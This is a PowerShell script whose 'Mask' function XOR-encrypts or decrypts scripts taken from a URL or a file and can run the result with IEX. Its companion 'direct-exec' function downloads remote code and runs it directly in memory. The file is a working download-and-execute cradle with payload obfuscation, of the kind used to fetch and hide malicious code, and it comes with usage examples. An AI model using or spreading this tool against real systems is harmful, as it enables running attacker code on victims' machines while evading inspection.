<#
.Synopsis
The Mask funtion is to download a script and encrypt it with given key and then write it to drive.
Or it can read a encrypted script and decrypt it and then execute it.
Or it can directly download the script and execute it 

.Parameter
-url      url of the script from where it will download the script
-InFile   the filename with full path to read the encrypted script
-outFile  the filename with full path to write the script
-key      key value which will be used for encryption/decryption (Mask function must need key, irect-exec don't need key)
-XoR      XoR switch to do xor operation for encryption/decryption
-Execute  Execute switch to execute the script

.Example

Import-Module mask.ps1
Mask -url "url of the script" -key "key value" -XoR (read from url and encrypt/decrypt the script with key and print in console)
Mask -InFile "input file of the script" -key "key value" -XoR (read from file and encrypt/decrypt the script with key and print in console)
Mask -url "url of the script" -key "key value" -outFile "output file" -XoR (read from url and encrypt/decrypt the script and write in the outputfile)
Mask -InFile "input file of the script" -key "key value" -outFile "output file" -XoR (read from file and encrypt/decrypt the script and write in the outputfile)

**if you give -Execute parameter the it will also execute the script along with the above mentioned operation

***if you don't give XoR then the script expect a url to directly read from url and execute it. it will call direct-exec function to read the script form url and execute it.

-direct-exec -url "url of script" (read from url and execute the script)

#>

function Mask
{
    param(
    [string]$url,
    [string]$InFile,
    [string]$outFile,
    [string]$key,
    [switch]$XoR,
    [switch]$Execute
    )

    $enc = [System.Text.Encoding]::ASCII

    if(!$url -and !$InFile)
    {
        Write-Host -ForegroundColor Red "No Input Given!!!"
        return
    }

    if(!$key)
    {
        Write-Host -ForegroundColor DarkRed "Please mention the key... there is no default Key!!!"
        return
    }

    if($XoR.IsPresent)
    {
         if($url -and $InFile)
         {
            Write-Host -ForegroundColor Cyan "Please mention any single source!!!"
            return
         }
         elseif($url -and !$InFile)
         {
            Write-Host -ForegroundColor Green "Getting Data from $url..."
            $r_msg = (New-Object System.Net.WebClient).DownloadString($url)
            $msg = $enc.GetBytes($r_msg)
            Write-Host -ForegroundColor Yellow "Data fetching Completed..."
         }
         elseif(!$url -and $InFile)
         {
            if(Test-Path $InFile)
            {
                Write-Host -ForegroundColor Green "Getting Data from $InFile..."
                $msg = [System.IO.File]::ReadAllBytes($InFile)
                Write-Host -ForegroundColor Yellow "Data fetching Completed..."
            }
            else
            {
                Write-Host -ForegroundColor Magenta "File doesn't exist... Exiting..."
                return
            }
         }

        $ek = $enc.GetBytes($key)
        try
        {
            for($i=0;$i -lt $msg.Count; $i=$i+$ek.Count)
            {
                for($j=0;$j -lt $ek.Count;$j++)
                {
                    $msg[$i+$j] = $msg[$i+$j] -bxor $ek[$j]
                }
   
            }
        }
        catch
        {
        }

        if(!$outFile -and !$Execute.IsPresent)
        {
            Write-Host -ForegroundColor Cyan "No outFile given...Execute flag not set... Printing the file in console..."
            Write-Host $enc.GetString($msg)
        }
        elseif(!$outFile -and $Execute.IsPresent)
        {
            Write-Host -ForegroundColor Cyan "No outFile given... Execute flag set... Executing the commands..."
            IEX($enc.GetString($msg))
            Write-Host -ForegroundColor DarkGreen "Execution Done!!!"
        }
        elseif($outFile -and !$Execute.IsPresent)
        {
            Write-Host -ForegroundColor Cyan "Writing the output to $outFile"
            [System.IO.File]::WriteAllBytes($outFile, $msg)
            Write-Host -ForegroundColor DarkGreen "File write completed..."
        }
        else
        {
            Write-Host -ForegroundColor Cyan "outFile and Execute both  is set..."
            Write-Host -ForegroundColor Cyan "Writing the output to $outFile"
            [System.IO.File]::WriteAllBytes($outFile, $msg)
            Write-Host -ForegroundColor DarkGreen "File write completed..."
            Write-Host -ForegroundColor Cyan "Executing the commands..."
            IEX($enc.GetString($msg))
            Write-Host -ForegroundColor DarkGreen "Execution Done!!!"

        }

    }
    else
    {
        if(!$url)
        {
            Write-Host -ForegroundColor Cyan "XoR not enabled!!!"
            Write-Host -ForegroundColor Cyan "No url provided... Exiting from script"
            return
        }
        else
        {
            direct-exec -url $url
        }
    }
}

function direct-exec{
        param(
        [string]$url
        )

        Write-Host -ForegroundColor Gray "XoR not specified... It'll take url to direct execute script in memory..."
        if(!$url)
        {
            Write-Host -ForegroundColor Cyan "No url provided... Exiting from script"
            return
        }
        else
        {
            Write-Host -ForegroundColor Cyan "About Execute code directly in memory"
            $code = (New-Object System.Net.WebClient).DownloadString($url)
            Write-Host -ForegroundColor Yellow "Executing code..."
            IEX($code)
            Write-Host -ForegroundColor Green "Execution complete..."
        }
    }




